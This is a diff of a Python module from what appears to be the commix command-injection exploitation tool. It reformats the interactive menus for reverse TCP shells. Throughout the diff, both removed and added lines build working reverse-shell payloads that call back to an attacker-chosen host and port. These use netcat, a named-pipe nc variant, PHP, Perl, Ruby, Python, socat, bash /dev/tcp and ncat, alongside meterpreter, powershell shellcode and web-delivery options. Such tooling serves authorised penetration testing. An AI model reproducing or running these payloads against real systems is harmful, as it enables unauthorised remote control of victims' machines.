@@ -35,60 +35,114 @@ from src.thirdparty.colorama import Fore, Back, Style, init
 Set up the netcat reverse TCP connection
 """
 def netcat_version(separator):
-
-  # Defined shell
+  # Defined shell.
   shell = "sh"
 
-  # Netcat alternatives
-  NETCAT_ALTERNATIVES = [
+  # Netcat alternatives.
+  NETCAT_ALTERNATIVES = (
     "nc",
     "busybox nc",
     "nc.traditional",
-    "nc.openbsd"
-  ]
+    "nc.openbsd",
+  )
 
-  settings.print_data_to_stdout(Style.BRIGHT + """Available netcat reverse TCP shell options:""" + Style.RESET_ALL + """
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use the default Netcat on target host.
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use Netcat for Busybox on target host.
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Netcat-Traditional on target host.
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use Netcat-Openbsd on target host.""")
+  # Available netcat reverse TCP shell options.
+  NETCAT_OPTIONS = (
+    ("1", "use the default Netcat on target host"),
+    ("2", "use Netcat for Busybox on target host"),
+    ("3", "use Netcat-Traditional on target host"),
+    ("4", "use Netcat-Openbsd on target host"),
+  )
+
+  message = (
+    Style.BRIGHT
+    + "Available netcat reverse TCP shell options:"
+    + Style.RESET_ALL
+    + "\n"
+  )
+
+  for option, description in NETCAT_OPTIONS:
+    message += (
+      settings.SUB_CONTENT_SIGN_TYPE
+      + "Type '"
+      + Style.BRIGHT
+      + option
+      + Style.RESET_ALL
+      + "' to "
+      + description
+      + ".\n"
+    )
+
+  settings.print_data_to_stdout(message.rstrip())
+
   while True:
-    nc_version = _input("""commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_netcat""" + Style.RESET_ALL + """) > """)
-    # Default Netcat
+    nc_version = _input(
+      "commix("
+      + Style.BRIGHT
+      + Fore.RED
+      + "reverse_tcp_netcat"
+      + Style.RESET_ALL
+      + ") > "
+    )
+
+    # Default Netcat.
     if nc_version == '1':
       nc_alternative = NETCAT_ALTERNATIVES[0]
       break
-    # Netcat for Busybox
-    if nc_version == '2':
+
+    # Netcat for Busybox.
+    elif nc_version == '2':
       nc_alternative = NETCAT_ALTERNATIVES[1]
       break
-    # Netcat-Traditional
+
+    # Netcat-Traditional.
     elif nc_version == '3':
       nc_alternative = NETCAT_ALTERNATIVES[2]
       break
-    # Netcat-Openbsd (nc without -e)
+
+    # Netcat-Openbsd (nc without -e).
     elif nc_version == '4':
       nc_alternative = NETCAT_ALTERNATIVES[3]
       break
-    # Check for available shell options
+
+    # Check for available shell options.
     elif any(option in nc_version.lower() for option in settings.SHELL_OPTIONS):
       if checks.shell_options(nc_version):
         return checks.shell_options(nc_version)
-    # Invalid option
+
+    # Invalid option.
     else:
       common.invalid_option(nc_version)
       continue
 
   nc_alternative, shell = checks.use_bin_subdir(nc_alternative, shell)
 
+  # Netcat with -e.
   if nc_version != '4':
-    # Netcat with -e
-    cmd = nc_alternative + settings.SINGLE_WHITESPACE + settings.LHOST + settings.SINGLE_WHITESPACE + settings.LPORT + " -e " + shell
+    cmd = (
+      nc_alternative
+      + settings.SINGLE_WHITESPACE
+      + settings.LHOST
+      + settings.SINGLE_WHITESPACE
+      + settings.LPORT
+      + " -e "
+      + shell
+    )
+
+  # nc without -e.
   else:
-    # nc without -e
-    cmd = shell + " -c \"" + shell + " 0</tmp/f | " + \
-           nc_alternative + settings.SINGLE_WHITESPACE + settings.LHOST + settings.SINGLE_WHITESPACE + settings.LPORT + \
-           " 1>/tmp/f\""
+    cmd = (
+      shell
+      + " -c \""
+      + shell
+      + " 0</tmp/f | "
+      + nc_alternative
+      + settings.SINGLE_WHITESPACE
+      + settings.LHOST
+      + settings.SINGLE_WHITESPACE
+      + settings.LPORT
+      + " 1>/tmp/f\""
+    )
 
   return cmd
 
@@ -97,80 +151,189 @@ Set up other [1] reverse tcp shell connections
 [1] http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 """
 def other_reverse_shells(separator):
-  settings.print_data_to_stdout(Style.BRIGHT + """Available generic reverse TCP shell options:""" + Style.RESET_ALL + """
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use a PHP reverse TCP shell.
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use a Perl reverse TCP shell.
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use a Ruby reverse TCP shell.
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use a Python reverse TCP shell.
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """5""" + Style.RESET_ALL + """' to use a Socat reverse TCP shell.
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a Bash reverse TCP shell.
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a Ncat reverse TCP shell.
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python reverse TCP shell (windows).
-""" + Style.BRIGHT + """Available meterpreter reverse TCP shell options:""" + Style.RESET_ALL + """
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """9""" + Style.RESET_ALL + """' to use a PHP meterpreter reverse TCP shell.
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """10""" + Style.RESET_ALL + """' to use a Python meterpreter reverse TCP shell.
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """11""" + Style.RESET_ALL + """' to use a meterpreter reverse TCP shell (windows).
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web delivery script.""")
+  # Generic reverse shell options.
+  GENERIC_REVERSE_SHELL_OPTIONS = (
+    ("1", "use a PHP reverse TCP shell"),
+    ("2", "use a Perl reverse TCP shell"),
+    ("3", "use a Ruby reverse TCP shell"),
+    ("4", "use a Python reverse TCP shell"),
+    ("5", "use a Socat reverse TCP shell"),
+    ("6", "use a Bash reverse TCP shell"),
+    ("7", "use a Ncat reverse TCP shell"),
+    ("8", "use a Python reverse TCP shell (windows)"),
+  )
+
+  # Meterpreter reverse shell options.
+  METERPRETER_REVERSE_SHELL_OPTIONS = (
+    ("9", "use a PHP meterpreter reverse TCP shell"),
+    ("10", "use a Python meterpreter reverse TCP shell"),
+    ("11", "use a meterpreter reverse TCP shell (windows)"),
+    ("12", "use the web delivery script"),
+  )
+
+  message = (
+    Style.BRIGHT
+    + "Available generic reverse TCP shell options:"
+    + Style.RESET_ALL
+    + "\n"
+  )
+
+  for option, description in GENERIC_REVERSE_SHELL_OPTIONS:
+    message += (
+      settings.SUB_CONTENT_SIGN_TYPE
+      + "Type '"
+      + Style.BRIGHT
+      + option
+      + Style.RESET_ALL
+      + "' to "
+      + description
+      + ".\n"
+    )
+
+  message += (
+    Style.BRIGHT
+    + "Available meterpreter reverse TCP shell options:"
+    + Style.RESET_ALL
+    + "\n"
+  )
+
+  for option, description in METERPRETER_REVERSE_SHELL_OPTIONS:
+    message += (
+      settings.SUB_CONTENT_SIGN_TYPE
+      + "Type '"
+      + Style.BRIGHT
+      + option
+      + Style.RESET_ALL
+      + "' to "
+      + description
+      + ".\n"
+    )
+
+  settings.print_data_to_stdout(message.rstrip())
+
   while True:
-    other_shell = _input("""commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL + """) > """)
+    other_shell = _input(
+      "commix("
+      + Style.BRIGHT
+      + Fore.RED
+      + "reverse_tcp_other"
+      + Style.RESET_ALL
+      + ") > "
+    )
+
     # PHP-reverse-shell
     if other_shell == '1':
-      other_shell = "php -r '$sock=fsockopen(\"" + settings.LHOST + "\"," + settings.LPORT + ");" \
-                    "$proc=proc_open(\"/bin/sh -i\",array(0%3d>$sock,1%3d>$sock,2%3d>$sock),$pipes);'"
+      other_shell = (
+        "php -r '$sock=fsockopen(\""
+        + settings.LHOST
+        + "\","
+        + settings.LPORT
+        + ");"
+        "$proc=proc_open(\"/bin/sh -i\",array(0%3d>$sock,1%3d>$sock,2%3d>$sock),$pipes);'"
+      )
       break
 
     # Perl-reverse-shell
     elif other_shell == '2':
-      other_shell = "perl -e 'use Socket;" \
-                    "$i=\"" + settings.LHOST  + "\";" \
-                    "$p=" + settings.LPORT  + ";" \
-                    "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));" \
-                    "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\");" \
-                    "open(STDOUT,\">%26S\");open(STDERR,\">%26S\");" \
-                    "exec(\"/bin/sh -i\");};'"
+      other_shell = (
+        "perl -e 'use Socket;"
+        "$i=\""
+        + settings.LHOST
+        + "\";"
+        "$p="
+        + settings.LPORT
+        + ";"
+        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
+        "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
+        "open(STDIN,\">%26S\");"
+        "open(STDOUT,\">%26S\");"
+        "open(STDERR,\">%26S\");"
+        "exec(\"/bin/sh -i\");};'"
+      )
       break
 
     # Ruby-reverse-shell
     elif other_shell == '3':
-      other_shell = "ruby -rsocket -e '" \
-                    "c=TCPSocket.new(\"" + settings.LHOST + "\"," + settings.LPORT + ");" \
-                    "$stdin.reopen(c);" \
-                    "$stdout.reopen(c);" \
-                    "$stderr.reopen(c);" \
-                    "$stdin.each_line{|l|l=l.strip;" \
-                    "next if l.length==0;" \
-                    "(IO.popen(l,\"rb\"){|fd| fd.each_line {|o| c.puts(o.strip) }}) rescue nil }'"
+      other_shell = (
+        "ruby -rsocket -e '"
+        "c=TCPSocket.new(\""
+        + settings.LHOST
+        + "\","
+        + settings.LPORT
+        + ");"
+        "$stdin.reopen(c);"
+        "$stdout.reopen(c);"
+        "$stderr.reopen(c);"
+        "$stdin.each_line{|l|l=l.strip;"
+        "next if l.length==0;"
+        "(IO.popen(l,\"rb\"){|fd| fd.each_line {|o| c.puts(o.strip) }}) rescue nil }'"
+      )
       break
 
     # Python-reverse-shell
     elif other_shell == '4':
       if not settings.USER_DEFINED_PYTHON_INTERPRETER:
         checks.set_python_interpreter()
-      other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c 'import socket,subprocess,os%0d" \
-                    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)%0d" \
-                    "s.connect((\"" + settings.LHOST  + "\"," + settings.LPORT + "))%0d" \
-                    "os.dup2(s.fileno(),0)%0d" \
-                    "os.dup2(s.fileno(),1)%0d" \
-                    "os.dup2(s.fileno(),2)%0d" \
-                    "p=subprocess.call([\"/bin/sh\",\"-i\"])%0d'"
+
+      other_shell = (
+        settings.LINUX_PYTHON_INTERPRETER
+        + " -c 'import socket,subprocess,os%0d"
+        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)%0d"
+        "s.connect((\""
+        + settings.LHOST
+        + "\","
+        + settings.LPORT
+        + "))%0d"
+        "os.dup2(s.fileno(),0)%0d"
+        "os.dup2(s.fileno(),1)%0d"
+        "os.dup2(s.fileno(),2)%0d"
+        "p=subprocess.call([\"/bin/sh\",\"-i\"])%0d'"
+      )
       break
 
     # Socat-reverse-shell
     elif other_shell == '5':
-      other_shell = "socat tcp-connect:" + settings.LHOST + ":" + settings.LPORT + \
-                    " exec:\"sh\",pty,stderr,setsid,sigint,sane"
+      other_shell = (
+        "socat tcp-connect:"
+        + settings.LHOST
+        + ":"
+        + settings.LPORT
+        + " exec:\"sh\",pty,stderr,setsid,sigint,sane"
+      )
       break
 
     # Bash-reverse-shell
     elif other_shell == '6':
-      tmp_file = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(5)])
-      other_shell = "echo \"/bin/sh 0>/dev/tcp/"+ settings.LHOST + "/" + settings.LPORT + \
-                    " 1>%260 2>%260\" > /tmp/" + tmp_file + settings.SINGLE_WHITESPACE + separator + " /bin/bash /tmp/" + tmp_file
+      tmp_file = ''.join(
+        [
+          random.choice(string.ascii_letters + string.digits)
+          for n in xrange(5)
+        ]
+      )
+
+      other_shell = (
+        "echo \"/bin/sh 0>/dev/tcp/"
+        + settings.LHOST
+        + "/"
+        + settings.LPORT
+        + " 1>%260 2>%260\" > /tmp/"
+        + tmp_file
+        + settings.SINGLE_WHITESPACE
+        + separator
+        + " /bin/bash /tmp/"
+        + tmp_file
+      )
       break
 
     # Ncat-reverse-shell
     elif other_shell == '7':
-      other_shell = "ncat " + settings.LHOST + settings.SINGLE_WHITESPACE + settings.LPORT + " -e /bin/sh"
+      other_shell = (
+        "ncat "
+        + settings.LHOST
+        + settings.SINGLE_WHITESPACE
+        + settings.LPORT
+        + " -e /bin/sh"
+      )
       break
 
     # Windows Python-reverse-shell
@@ -225,7 +388,7 @@ def other_reverse_shells(separator):
           " LPORT=" + str(settings.LPORT) +
           " -e php/base64 -o " + output + settings.NO_OUTPUT, shell=True).wait()
 
-        with open (output, "r+") as content_file:
+        with open(output, "r+") as content_file:
           data = content_file.readlines()
           data = ''.join(data).replace(settings.END_LINE.LF,settings.SINGLE_WHITESPACE)
 
@@ -268,10 +431,9 @@ def other_reverse_shells(separator):
           " LPORT=" + str(settings.LPORT) +
           " -o " + output + settings.NO_OUTPUT, shell=True).wait()
 
-        with open (output, "r") as content_file:
+        with open(output, "r") as content_file:
           data = content_file.readlines()
           data = ''.join(data)
-          #data = base64.b64encode(data.encode(settings.DEFAULT_CODEC)).decode()
 
         settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
         # Remove the ouput file.
@@ -302,17 +464,42 @@ def other_reverse_shells(separator):
         checks.windows_only_attack_vector()
         continue
       else:
-        settings.print_data_to_stdout(Style.BRIGHT + """Available powershell injection options:""" + Style.RESET_ALL + """
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use shellcode injection with native x86 shellcode.
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use TrustedSec's Magic Unicorn.""")
+        message = (
+          Style.BRIGHT
+          + "Available powershell injection options:"
+          + Style.RESET_ALL
+          + "\n"
+          + settings.SUB_CONTENT_SIGN_TYPE
+          + "Type '"
+          + Style.BRIGHT
+          + "1"
+          + Style.RESET_ALL
+          + "' to use shellcode injection with native x86 shellcode.\n"
+          + settings.SUB_CONTENT_SIGN_TYPE
+          + "Type '"
+          + Style.BRIGHT
+          + "2"
+          + Style.RESET_ALL
+          + "' to use TrustedSec's Magic Unicorn."
+        )
+        settings.print_data_to_stdout(message)
+
         while True:
-          windows_reverse_shell = _input("""commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + Style.RESET_ALL + """) > """)
+          windows_reverse_shell = _input(
+            "commix("
+            + Style.BRIGHT
+            + Fore.RED
+            + "windows_meterpreter_reverse_tcp"
+            + Style.RESET_ALL
+            + ") > "
+          )
+
           if any(option in windows_reverse_shell.lower() for option in settings.SHELL_OPTIONS):
             if checks.shell_options(windows_reverse_shell):
               return checks.shell_options(windows_reverse_shell)
-          elif windows_reverse_shell == '1' :
+          elif windows_reverse_shell == '1':
             output = "powershell_attack.rc"
-          elif windows_reverse_shell == '2' :
+          elif windows_reverse_shell == '2':
             output = "powershell_attack.txt"
           else:
             common.invalid_option(windows_reverse_shell)
@@ -396,13 +583,43 @@ def other_reverse_shells(separator):
 
     # Web delivery script
     elif other_shell == '12':
-      settings.print_data_to_stdout(Style.BRIGHT +  """Available web delivery script options:""" + Style.RESET_ALL + """
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use Python meterpreter reverse TCP shell.
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use PHP meterpreter reverse TCP shell.
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use meterpreter reverse TCP shell (windows).""")
+      message = (
+        Style.BRIGHT
+        + "Available web delivery script options:"
+        + Style.RESET_ALL
+        + "\n"
+        + settings.SUB_CONTENT_SIGN_TYPE
+        + "Type '"
+        + Style.BRIGHT
+        + "1"
+        + Style.RESET_ALL
+        + "' to use Python meterpreter reverse TCP shell.\n"
+        + settings.SUB_CONTENT_SIGN_TYPE
+        + "Type '"
+        + Style.BRIGHT
+        + "2"
+        + Style.RESET_ALL
+        + "' to use PHP meterpreter reverse TCP shell.\n"
+        + settings.SUB_CONTENT_SIGN_TYPE
+        + "Type '"
+        + Style.BRIGHT
+        + "3"
+        + Style.RESET_ALL
+        + "' to use meterpreter reverse TCP shell (windows)."
+      )
+      settings.print_data_to_stdout(message)
+
       while True:
-        web_delivery = _input("""commix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + """) > """)
-        if any(option in  web_delivery.lower() for option in settings.SHELL_OPTIONS):
+        web_delivery = _input(
+          "commix("
+          + Style.BRIGHT
+          + Fore.RED
+          + "web_delivery"
+          + Style.RESET_ALL
+          + ") > "
+        )
+
+        if any(option in web_delivery.lower() for option in settings.SHELL_OPTIONS):
           if checks.shell_options(web_delivery):
             return checks.shell_options(web_delivery)
         elif web_delivery == '1':
@@ -461,10 +678,12 @@ def other_reverse_shells(separator):
             checks.msf_launch_msg(output)
             break
       break
+
     # Check for available shell options
     elif any(option in other_shell.lower() for option in settings.SHELL_OPTIONS):
       if checks.shell_options(other_shell):
         return checks.shell_options(other_shell)
+
     # Invalid option
     else:
       common.invalid_option(other_shell)
@@ -476,40 +695,79 @@ def other_reverse_shells(separator):
 Choose type of reverse TCP connection.
 """
 def reverse_tcp_options(separator):
+  # Available reverse TCP shell options.
+  REVERSE_TCP_OPTIONS = (
+    ("1", "use netcat reverse TCP shells"),
+    ("2", "use other reverse TCP shells"),
+  )
 
-  settings.print_data_to_stdout(Style.BRIGHT + """Available reverse TCP shell options:""" + Style.RESET_ALL + """
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' for netcat reverse TCP shells.
-""" + settings.SUB_CONTENT_SIGN_TYPE + """Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' for other reverse TCP shells.""")
+  message = (
+    Style.BRIGHT
+    + "Available reverse TCP shell options:"
+    + Style.RESET_ALL
+    + "\n"
+  )
+
+  for option, description in REVERSE_TCP_OPTIONS:
+    message += (
+      settings.SUB_CONTENT_SIGN_TYPE
+      + "Type '"
+      + Style.BRIGHT
+      + option
+      + Style.RESET_ALL
+      + "' for "
+      + description
+      + ".\n"
+    )
+
+  settings.print_data_to_stdout(message.rstrip())
+
   while True:
-    reverse_tcp_option = _input("""commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """) > """)
+    reverse_tcp_option = _input(
+      "commix("
+      + Style.BRIGHT
+      + Fore.RED
+      + "reverse_tcp"
+      + Style.RESET_ALL
+      + ") > "
+    )
+
     if reverse_tcp_option.lower() == "reverse_tcp":
-      warn_msg = "You are into the '" + reverse_tcp_option.lower() + "' mode."
+      warn_msg = "You are into '" + reverse_tcp_option.lower() + "' mode."
       settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
       continue
 
-    # Option 1 - Netcat shell
-    elif reverse_tcp_option == '1' :
+    # Option 1 - Netcat shell.
+    elif reverse_tcp_option == '1':
       reverse_tcp_option = netcat_version(separator)
+
       if reverse_tcp_option.lower() not in settings.SHELL_OPTIONS:
         checks.shell_success("reverse")
         break
+
       elif reverse_tcp_option.lower() in settings.SHELL_OPTIONS:
         return reverse_tcp_option
+
       else:
         pass
-    # Option 2 - Other (Netcat-Without-Netcat) shells
-    elif reverse_tcp_option == '2' :
+
+    # Option 2 - Other reverse TCP shells.
+    elif reverse_tcp_option == '2':
       reverse_tcp_option = other_reverse_shells(separator)
+
       if settings.EVAL_BASED_STATE != False:
-        reverse_tcp_option = reverse_tcp_option.replace("$","\\$")
+        reverse_tcp_option = reverse_tcp_option.replace("$", "\\$")
+
       if reverse_tcp_option.lower() not in settings.SHELL_OPTIONS:
         checks.shell_success("reverse")
         break
-    # Check for available shell options
+
+    # Check for available shell options.
     elif any(option in reverse_tcp_option.lower() for option in settings.SHELL_OPTIONS):
       if checks.shell_options(reverse_tcp_option):
         return checks.shell_options(reverse_tcp_option)
-    # Invalid option
+
+    # Invalid option.
     else:
       common.invalid_option(reverse_tcp_option)
       continue
@@ -520,29 +778,45 @@ def reverse_tcp_options(separator):
 Set up the reverse TCP connection
 """
 def configure_reverse_tcp(separator):
-  # Set up LHOST for the reverse TCP connection
+  # Set up LHOST for the reverse TCP connection.
   while True:
     settings.print_data_to_stdout(settings.END_LINE.CR + settings.REVERSE_TCP_SHELL)
+
     option = _input()
+
     if option.lower() == "reverse_tcp":
       warn_msg = "You are into the '" + option.lower() + "' mode."
       settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
       continue
-    if option.lower() == "?":
+
+    # Display reverse TCP options.
+    elif option.lower() == "?":
       menu.reverse_tcp_options()
       continue
-    if option.lower() == "quit" or option.lower() == "exit":
+
+    # Exit Commix.
+    elif option.lower() == "quit" or option.lower() == "exit":
       raise SystemExit()
+
+    # Return to previous shell context.
     elif option.lower() == "os_shell" or option.lower() == "back":
       settings.REVERSE_TCP = False
       break
+
+    # Switch to bind TCP mode.
     elif option.lower() == "bind_tcp":
       settings.BIND_TCP = True
       settings.REVERSE_TCP = False
       break
+
+    # Continue when required options are set.
     elif len(settings.LPORT) != 0 and len(settings.LHOST) != 0:
       break
+
+    # Handle set options.
     elif option[0:4].lower() == "set ":
+
+      # Set local host.
       if option[4:10].lower() == "lhost ":
         if checks.check_lhost(option[10:]):
           if len(settings.LPORT) == 0:
@@ -551,11 +825,15 @@ def configure_reverse_tcp(separator):
             break
         else:
           continue
+
+      # RHOST is not supported in reverse TCP mode.
       elif option[4:10].lower() == "rhost ":
-        err_msg =  "The '" + option[4:9].upper() + "' option, is not "
+        err_msg = "The '" + option[4:9].upper() + "' option, is not "
         err_msg += "usable for 'reverse_tcp' mode. Use 'LHOST' option."
         settings.print_data_to_stdout(settings.print_error_msg(err_msg))
         continue
+
+      # Set local port.
       elif option[4:10].lower() == "lport ":
         if checks.check_lport(option[10:]):
           if len(settings.LHOST) == 0:
@@ -564,13 +842,21 @@ def configure_reverse_tcp(separator):
             break
         else:
           continue
+
+      # Set server port.
       elif option[4:12].lower() == "srvport ":
         checks.check_srvport(option[12:])
+
+      # Set URI path.
       elif option[4:12].lower() == "uripath ":
         checks.check_uripath(option[12:])
+
+      # Invalid set option.
       else:
         common.invalid_option(option)
         pass
+
+    # Invalid option.
     else:
       common.invalid_option(option)
       pass
